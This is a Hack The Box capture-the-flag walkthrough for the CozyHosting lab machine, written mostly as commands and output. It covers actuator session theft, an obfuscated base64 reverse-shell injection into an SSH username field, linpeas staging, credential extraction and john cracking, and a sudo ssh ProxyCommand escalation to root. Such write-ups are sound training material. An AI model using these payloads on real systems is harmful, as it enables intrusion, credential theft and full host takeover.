# CozyHosting - https://app.hackthebox.com/machines/CozyHosting

```bash
sudo nmap -sC -sV 10.129.39.149             

Nmap scan report for 10.129.39.149
Host is up (0.37s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
cat /etc/hosts | grep -i cozyhosting.htb   
10.129.39.149	cozyhosting.htb
```

```bash
curl -s http://cozyhosting.htb/actuator | jq
{
  "_links": {
    "self": {
      "href": "http://localhost:8080/actuator",
      "templated": false
    },
    "sessions": {
      "href": "http://localhost:8080/actuator/sessions",
      "templated": false
    },
    "beans": {
      "href": "http://localhost:8080/actuator/beans",
      "templated": false
    },
    "health-path": {
      "href": "http://localhost:8080/actuator/health/{*path}",
      "templated": true
    },
    "health": {
      "href": "http://localhost:8080/actuator/health",
      "templated": false
    },
    "env": {
      "href": "http://localhost:8080/actuator/env",
      "templated": false
    },
    "env-toMatch": {
      "href": "http://localhost:8080/actuator/env/{toMatch}",
      "templated": true
    },
    "mappings": {
      "href": "http://localhost:8080/actuator/mappings",
      "templated": false
    }
  }
}
```

```bash
curl -s http://cozyhosting.htb/actuator/sessions | jq
{
  "D1042314A3E7E368AD64E887419A20DB": "kanderson",
  "4AD9D88C36446B0B21AF6699BE2590F8": "UNAUTHORIZED"
}
```

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: cozyhosting.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Referer: http://cozyhosting.htb/login' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'JSESSIONID=3A9B13E0429E659D75B2427450F83E85' \
    $'http://cozyhosting.htb/login?error'


curl -i -s -k -X $'GET' \
    -H $'Host: cozyhosting.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Referer: http://cozyhosting.htb/login?error' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'JSESSIONID=3A9B13E0429E659D75B2427450F83E85' \
    $'http://cozyhosting.htb/admin'
```

### Request
```bash
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=7D2677E7373404A7513317AD0538C9F4
Upgrade-Insecure-Requests: 1

host=10.10.16.47&username='
```
### Response
```bash
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 18 Dec 2023 20:12:52 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=/bin/bash: -c: line 1: unexpected EOF while looking for matching `''/bin/bash: -c: line 2: syntax error: unexpected end of file
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```

```bash
echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ3Lzk5OTkgMD4mMQ==" | base64 -d 
/bin/bash -i >& /dev/tcp/10.10.16.47/9999 0>&1


nc -lvnp 9999
listening on [any] 9999 ...
```

```bash
# The default value of IFS is space, tab, newline. All of these characters are whitespace. If you need a single space, you can use ${IFS%??}.
# https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces

;echo${IFS%??}"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ3Lzk5OTkgMD4mMQ=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;

#After URL encoding
%3becho${IFS%25%3f%3f}"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ3Lzk5OTkgMD4mMQ%3d%3d"${IFS%25%3f%3f}|${IFS%25%3f%3f}base64${IFS%25%3f%3f}-d${IFS%25%3f%3f}|${IFS%25%3f%3f}bash%3b
```

```bash
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 165
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=7D2677E7373404A7513317AD0538C9F4
Upgrade-Insecure-Requests: 1

host=10.10.16.47&username=%3becho${IFS%25%3f%3f}"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ3Lzk5OTkgMD4mMQ%3d%3d"${IFS%25%3f%3f}|${IFS%25%3f%3f}base64${IFS%25%3f%3f}-d${IFS%25%3f%3f}|${IFS%25%3f%3f}bash%3b
```

```bash
nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.47] from (UNKNOWN) [10.129.39.149] 51520
bash: cannot set terminal process group (1002): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
```

```bash
app@cozyhosting:/app$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"

[joker:~/Desktop/htb/cozyHosting]$ stty raw -echo;fg
[1]  + 83011 continued  nc -lvnp 9999

app@cozyhosting:/app$ export TERM=xterm
```

```bash
cp /home/joker/Desktop/htb/keeper/linpeas.sh .
[joker:~/Desktop/htb/cozyHosting]$ python3 -m http.server 9998
Serving HTTP on 0.0.0.0 port 9998 (http://0.0.0.0:9998/) ...
```

```bash
app@cozyhosting:/tmp$ wget 10.10.16.47:9998/linpeas.sh
--2023-12-18 21:20:26--  http://10.10.16.47:9998/linpeas.sh
Connecting to 10.10.16.47:9998... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847834 (828K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 827.96K   277KB/s    in 3.0s    

2023-12-18 21:20:30 (277 KB/s) - ‘linpeas.sh’ saved [847834/847834]
```

```bash
app@cozyhosting:/tmp$ chmod 777 linpeas.sh 
app@cozyhosting:/tmp$ ./linpeas.sh 
```
```bash
app@cozyhosting:/app$ ls -la
total 58856
drwxr-xr-x  2 root root     4096 Aug 14 14:11 .
drwxr-xr-x 19 root root     4096 Aug 14 14:11 ..
-rw-r--r--  1 root root 60259688 Aug 11 00:45 cloudhosting-0.0.1.jar
```

```bash
app@cozyhosting:/app$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
wget http://cozyhosting.htb:8000/cloudhosting-0.0.1.jar
--2023-12-18 16:37:50--  http://cozyhosting.htb:8000/cloudhosting-0.0.1.jar
Resolving cozyhosting.htb (cozyhosting.htb)... 10.129.39.149
Connecting to cozyhosting.htb (cozyhosting.htb)|10.129.39.149|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 60259688 (57M) [application/java-archive]
Saving to: ‘cloudhosting-0.0.1.jar’

cloudhosting-0.0.1.jar  100%[============================>]  57.47M   434KB/s    in 2m 20s  

2023-12-18 16:40:11 (420 KB/s) - ‘cloudhosting-0.0.1.jar’ saved [60259688/60259688]
```

```bash
jadx-gui cloudhosting-0.0.1.jar


#BOOT-INF/classes/application.properties

server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

```bash
psql -h localhost -d cozyhosting -U postgres
Password for user postgres: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

cozyhosting=# 
```

```bash
cozyhosting-# \list

                                 List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

```bash
cozyhosting-# \d

              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)
```

```bash
cozyhosting=# select * from users;

 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

```bash
cat creds         
$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

```bash
john creds --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
```

```bash
ssh josh@cozyhosting.htb
josh@cozyhosting.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

josh@cozyhosting:~$ id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
josh@cozyhosting:~$ cat user.txt 
ac8d0c28253126421391b2d72176a6a5
```
# Privilege Escalation

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Sorry, try again.
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
#https://gtfobins.github.io/gtfobins/ssh/#sudo

josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
b6b94ccfcd744c1fd92fd9edcdd7c5b7
```
